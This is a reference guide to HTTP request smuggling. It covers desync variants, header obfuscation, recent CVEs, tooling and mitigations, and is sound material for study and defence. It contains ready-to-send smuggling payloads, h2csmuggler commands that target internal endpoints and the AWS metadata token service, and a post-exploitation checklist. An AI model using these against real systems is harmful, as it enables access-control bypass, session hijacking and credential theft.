# HTTP Request Smuggling

## General

HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users. Request smuggling attacks involve placing both the Content-Length header and the Transfer-Encoding header into a single HTTP request and manipulating these so that the front-end and back-end servers process the request differently. The exact way in which this is done depends on the behavior of the two servers: Most HTTP request smuggling vulnerabilities arise because the HTTP specification provides two different ways to specify where a request ends: the Content-Length header and the Transfer-Encoding header.


HTTP request smuggling (CWE-444) occurs when different components in a web infrastructure—such as proxies, load balancers, and backend servers—interpret the same HTTP request differently. This mismatch lets attackers smuggle a hidden malicious request inside a legitimate one .

The vulnerability was first discovered in 2005 and saw a significant resurgence in 2019 due to groundbreaking research on HTTP desync attacks. In 2022, browser-powered desync attacks and the movement toward HTTP/1.1 deprecation were highlighted as emerging trends .

---

## Core Concepts

### How HTTP Request Boundaries Are Defined

The HTTP/1.1 specification provides two different ways to specify where a request ends:

**Content-Length Header** - Specifies the length of the message body in bytes. For example:

```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

**Transfer-Encoding Header** - Specifies that the message body uses chunked encoding. The message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents. The message is terminated with a chunk of size zero. For example:

```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0

```

When both headers are present, the HTTP specification states that the Content-Length header should be ignored. However, when multiple servers are chained together, inconsistencies in how each server handles these headers can lead to request smuggling vulnerabilities .

---

## Attack Variants

Classic request smuggling attacks involve manipulating the Content-Length and Transfer-Encoding headers so that front-end and back-end servers process the request differently :

### CL.TE (Content-Length / Transfer-Encoding)

The front-end server uses the Content-Length header, and the back-end server uses the Transfer-Encoding header.

**Detection via Time Delay:**

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

**Detection via Response Analysis (Using Burp Repeater - send twice):**

```http
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

The second response should indicate an unrecognized method (e.g., "Unrecognized method GPOST") .

### TE.CL (Transfer-Encoding / Content-Length)

The front-end server uses the Transfer-Encoding header, and the back-end server uses the Content-Length header.

**Detection via Time Delay:**

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

**Detection via Response Analysis (Burp Repeater - "Update Content-Length" unchecked, send twice):**

```http
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

### TE.TE (Obfuscated Transfer-Encoding)

Both front-end and back-end servers support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header.

**Detection via Response Analysis (Burp Repeater - "Update Content-Length" unchecked, send twice):**

```http
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

---

## Obfuscation Techniques for TE.TE Detection & Evasion

Numerous obfuscation methods can be used to induce one server to ignore the Transfer-Encoding header :

**Duplicate Headers:**
```http
Transfer-Encoding: chunkedx
Transfer-Encoding: chunked
```

**Whitespace Variations:**
```http
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
```

**Obsolete Line Folding (obs-fold):**
```http
Transfer-Encoding:
[tab]chunked
```

**CRLF Injection in Header Values:**
```http
X: X[\n]Transfer-Encoding: chunked
```

**Line Break Manipulation:**
```http
Transfer-Encoding
: chunked
```

---

## Real-World Exploits and High-Profile Cases

### CVE-2025-55315: ASP.NET Core Kestrel Vulnerability ($10,000 Bounty, CVSS 9.9)

In 2025, a critical HTTP request smuggling vulnerability was discovered in Microsoft's ASP.NET Core Kestrel web server. This vulnerability, assigned CVE-2025-55315, received a CVSS score of 9.9—the highest severity rating ever assigned to an ASP.NET Core vulnerability .

**Technical Details:** The vulnerability existed in Kestrel's chunk parsing implementation. The vulnerable code in the `ParseExtension` method searched only for the `\r` (carriage return) character when parsing chunk extensions. This meant that if a chunk extension contained a lone `\n` (line feed) character, Kestrel would treat it as part of the extension and continue searching for the `\r\n` sequence. However, many proxies interpret a lone `\n` as a line terminator, creating a parsing discrepancy .

**Example Malformed Request:**
```http
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked

2;\n
xx
45
GET /admin HTTP/1.1
Host: example.com

0

```

**Attack Impact:**
- **Request Tunneling:** Bypass front-end WAF and access control rules
- **Request Hijacking:** Steal victim cookies, authorization headers, and session tokens
- **Cache Poisoning:** Inject malicious responses into intermediate caches

**Timeline:**
- Discovery: June 19, 2025
- Disclosure to Microsoft: June 22, 2025
- Patch Released: October 14, 2025 

### CVE-2025-4366: Cloudflare Pingora Framework Vulnerability

On April 11, 2025, Cloudflare was notified of a request smuggling vulnerability in the Pingora OSS framework (CVE-2025-4366) via its Bug Bounty Program. The vulnerability affected customers using the free tier of Cloudflare's CDN and users of the caching functionality in pingora-proxy and pingora-cache crates .

**Technical Details:** When caching was enabled, Pingora skipped proper request body consumption logic on cache hits. This meant that after a cache hit response was sent downstream, any unread request body left in the HTTP/1.1 connection could act as a vector for request smuggling .

**Example Attack Request:**
```http
GET /attack/foo.jpg HTTP/1.1
Host: example.com
content-length: 79

GET / HTTP/1.1
Host: attacker.example.com
Bogus: foo
```

When a subsequent request to `victim.example.com` was sent on the same reused connection, the smuggled request was interpreted as the beginning of the next request, allowing header and URL injection .

**Secondary Attack Effect:** Some origin servers would respond to the rewritten attacker Host header with a 301 redirect. When the client browser followed the redirect, it would send a request to the attacker hostname along with a Referrer header indicating which URL was originally visited—enabling attackers to observe what traffic a visitor was trying to access .

**Mitigation Timeline:**
- Vulnerability reported: April 11, 2025 09:20 UTC
- Traffic disabled to vulnerable component: April 12, 2025 06:44 UTC
- Patch deployed: April 19, 2025 

### CVE-2026-2332: Eclipse Jetty "Funky Chunks" Vulnerability

In 2026, a vulnerability was discovered in Eclipse Jetty where the HTTP/1.1 parser was vulnerable to request smuggling when chunk extensions were used, similar to the "funky chunks" techniques. Jetty terminates chunk extension parsing at `\r\n` inside quoted strings instead of treating this as an error .

**Example Attack Request:**
```http
POST / HTTP/1.1
Host: localhost
Transfer-Encoding: chunked

1;ext="val
X
0

GET /smuggled HTTP/1.1
...
```

**Affected Versions:**
- Jetty 12.1.0 through 12.1.6
- Jetty 12.0.0 through 12.0.32
- Jetty 11.0.0 through 11.0.27
- Jetty 10.0.0 through 10.0.27
- Jetty 9.4.0 through 9.4.59 

### CVE-2026-2833: Pingora HTTP/1.1 Upgrade Handling Vulnerability

Another vulnerability in Pingora (CVE-2026-2833) affected its handling of HTTP/1.1 connection upgrades. When Pingora processed a request containing an Upgrade header, it prematurely began forwarding subsequent bytes to the backend server before confirming that the backend had accepted the upgrade .

**Attack Impact:** This timing flaw allowed attackers to forward malicious payloads directly after a request with an Upgrade header, enabling the payload to be interpreted as a subsequent request header by the backend—effectively bypassing proxy-level security controls including ACLs and WAF logic .

**Affected Versions:** Pingora versions prior to v0.8.0 .

### Major CDN and Enterprise Vulnerabilities (2025)

In 2025, researcher James Kettle and a team of bug bounty hunters discovered multiple high-value targets affected by HTTP request smuggling vulnerabilities :

| Target | Bounty Award | Impact |
|--------|--------------|--------|
| Akamai CDN (CVE-2025-32094) | $9,000 | Potential large-scale user credential theft |
| T-Mobile (non-production) | $12,000 | Unauthorized access to internal systems |
| GitLab | $7,000 | Exposure of bug bounty program reports |
| Cloudflare CDN | $7,000 | Redirecting millions of protected website visitors to malicious sites |
| Netlify CDN | Not disclosed | CDN system compromise |

---

## Advanced Attack Techniques

### Chunk Extension Parsing Discrepancies (Funky Chunks)

A new class of request smuggling vulnerabilities exploits how HTTP parsers handle chunk extensions inconsistently. According to RFC 9112, chunk extension names must be valid token values excluding control characters, but many implementations accept lone control characters such as `\n` or `\r` .

**Example of a malformed chunked request exploiting parsing differences:**
```http
POST /one HTTP/1.1
Host: example.com
Transfer-Encoding: chunked

2;\n
xx
45
GET /admin HTTP/1.1
Host: example.com

0

```

**Parsing Differences:**
- **Front-end interpretation:** Interprets `\n` after semicolon as line terminator. Chunk 1: size 2, body "xx". Chunk 2: size 45. The `GET /admin` request is hidden inside what the proxy perceives as the body of the second chunk.
- **Backend (Kestrel) interpretation:** Treats `\n` as part of chunk extension, not terminator. The `45\r\n0\r\n\r\n` sequence is consumed as part of the first chunk's extension and data. The `GET /admin` request is interpreted as a separate, second pipelined request .

This technique, known as "Funky Chunks," was first documented in 2025 and demonstrates the ongoing evolution of request smuggling attack vectors .

### HTTP/2 Downgrade Attacks

When a front-end server speaks HTTP/2 and the backend expects HTTP/1, CRLF sequences inserted within header values can be interpreted by the backend as header separators. This allows attackers to hide headers from the front-end while spoofing them to the backend .

**Example:**
```http
POST / HTTP/2
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
X-CRLF: x[\r\n]Transfer-Encoding: chunked

0

X
```

When downgraded to HTTP/1.1, this becomes:
```http
X-CRLF: x
Transfer-Encoding: chunked
```

### H2C Smuggling

H2C (HTTP/2 Cleartext) smuggling is a technique that uses h2c-compatible backend servers to establish HTTP/2 cleartext communication and hide HTTP traffic through insecure edge server proxy_pass configurations .

**Tool Usage:**
```bash
# Test a single proxy server for insecure h2c configuration
./h2csmuggler.py -x https://edgeserver --test

# Scan a list of URLs for affected endpoints
./h2csmuggler.py --scan-list urls.txt --threads 5

# Brute-force internal endpoints through smuggling
./h2csmuggler.py -x https://edgeserver -i dirs.txt http://localhost/

# Smuggle requests to internal backend endpoints
./h2csmuggler.py -x https://edgeserver -X POST -d '{"user":128457,"role":"admin"}' -H "Content-Type: application/json" http://backend/api/internal/user/permissions

# Exploit Host Header SSRF to access AWS metadata
./h2csmuggler.py -x https://edgeserver -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" http://169.254.169.254/latest/api/token
```

---

## Tools

```bash
# Smuggler - HTTP Request Smuggling Detection Tool
# https://github.com/defparam/smuggler
python3 smuggler.py -u <URL>
# https://github.com/defparam/tiscripts

# http-request-smuggling - Python-based smuggling tool
# https://github.com/anshumanpattnaik/http-request-smuggling/
python3 smuggle.py -u <URL>

# h2csmuggler - HTTP/2 Cleartext Smuggling Tool
# https://github.com/BishopFox/h2csmuggler
go run ./cmd/h2csmuggler check https://google.com/ http://localhost

# Burp Suite Extensions
# - HTTP Request Smuggler (PortSwigger official plugin)
#   Available via BApp Store, provides automated scanning and exploitation
```

### Using Burp Suite for Request Smuggling Testing

1. **Disable "Update Content-Length"** in Repeater menu when manually crafting smuggling payloads
2. **Switch protocol to HTTP/1** in Inspector panel's request properties when testing HTTP/2 endpoints
3. **Send requests twice** to observe the smuggled request's effect on the subsequent request
4. **Monitor response discrepancies** such as unrecognized method errors or time delays

---

## Attack Impact and Consequences

Successful HTTP request smuggling attacks can have severe security consequences :

**Session Hijacking:** Attackers can steal user login credentials and impersonate legitimate users to access sensitive resources. By smuggling requests that cause the backend to append victim requests (including cookies and authorization headers) to the smuggled request body, attackers can capture session tokens.

**Credential Theft:** When a victim's request is appended to a smuggled request, the server returns the victim's sensitive data in the response to the attacker.

**Bypassing Security Controls:** Smuggled requests can bypass front-end security controls including WAF, access control lists (ACLs), and IP-based restrictions since they are not inspected by the proxy layer.

**Cache Poisoning:** Attackers can cause the server to store and serve malicious content to other innocent users. This is particularly dangerous due to its persistence and diffusion—a single successful attack can affect many subsequent visitors.

**Cross-User Attacks:** Attackers can perform actions on behalf of other users by smuggling requests that appear to originate from trusted proxy IPs, bypassing IP-based access controls.

**Request Hijacking (Browser-Powered):** Attackers can cause victims' browsers to make requests to attacker-controlled servers, observing which URLs the victims were attempting to access via Referrer headers.

---

## Detection and Exploitation Methodology

### Step 1: Identify the Attack Surface

- Test endpoints that handle user-supplied input
- Focus on requests that include both Content-Length and Transfer-Encoding headers
- Check for HTTP/1.1 endpoints (HTTP/2 endpoints may be vulnerable through downgrade)
- Test cacheable endpoints for potential cache poisoning

### Step 2: Detect Parsing Inconsistencies

**Time Delay Detection:**
- Send a request designed to cause a timeout on one server
- If a delay occurs, a parsing discrepancy likely exists

**Response Analysis Detection:**
- Send a request that smuggles a second request with an invalid method (e.g., GPOST)
- Send the request twice and observe the second response
- If the second response indicates the invalid method was processed, smuggling is possible

### Step 3: Exploit the Vulnerability

**CL.TE Exploitation:**
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
```

**TE.CL Exploitation:**
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /admin HTTP/1.1
Host: vulnerable.com
Content-Length: 15

x=1
0

```

### Step 4: Post-Exploitation

- Capture victim requests to steal session cookies
- Access internal endpoints not exposed to the internet
- Poison caches with malicious responses
- Perform SSRF attacks through smuggled requests
- Use connection pooling to affect multiple victims

---

## Mitigation Strategies

### Immediate Actions

1. **Patch vulnerable components** - Update to the latest patched versions:
   - Pingora: Upgrade to v0.5.0 or later (CVE-2025-4366) or v0.8.0 (CVE-2026-2833)
   - ASP.NET Core Kestrel: Apply October 2025 patches (CVE-2025-55315)
   - Eclipse Jetty: Upgrade to versions 12.1.7+, 12.0.33+, 11.0.28+, 10.0.28+, or 9.4.60+ (CVE-2026-2332)

2. **Disable connection pooling** as a temporary workaround to reduce session hijacking risk 

3. **Implement request filtering** to reject requests containing ambiguous headers

4. **Deploy a reverse proxy** that properly handles HTTP semantics in front of vulnerable components 

### Long-Term Solutions

1. **Migrate to HTTP/2 end-to-end** - HTTP/2 uses binary framing, eliminating the ambiguous parsing scenarios that make request smuggling possible. This is the most effective long-term mitigation .

2. **Standardize HTTP parsing** across all infrastructure components - Ensure front-end and back-end servers use identical HTTP parsing logic.

3. **Disable HTTP/1.1 where possible** - The protocol remains fundamentally insecure with new attack variants continuously bypassing existing protections .

4. **Implement strict input validation** - Reject malformed requests containing ambiguous or non-compliant headers.

5. **Monitor for indicators of compromise**:
   - Unexpected HTTP requests in backend logs without corresponding proxy access logs
   - Anomalous Upgrade headers with unusual trailing content
   - Cache poisoning incidents with unexpected content
   - Unusual patterns of 101 Switching Protocols responses 

### Detection Monitoring

- Implement correlation rules between proxy access logs and backend server logs
- Configure alerting for requests appearing at backends without corresponding proxy entries
- Monitor for unusual patterns of upgrade request failures
- Deploy deep packet inspection to identify potential request smuggling patterns 

---

## References and Further Reading

- PortSwigger Research: HTTP Desync Attacks (James Kettle, 2019-2022)
- "HTTP/1.1 must die: the desync endgame" - PortSwigger Research
- "Funky Chunks" research series - w4ke.info (2025)
- RFC 9112 - HTTP/1.1 Semantics and Content
- RFC 7230 - Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing
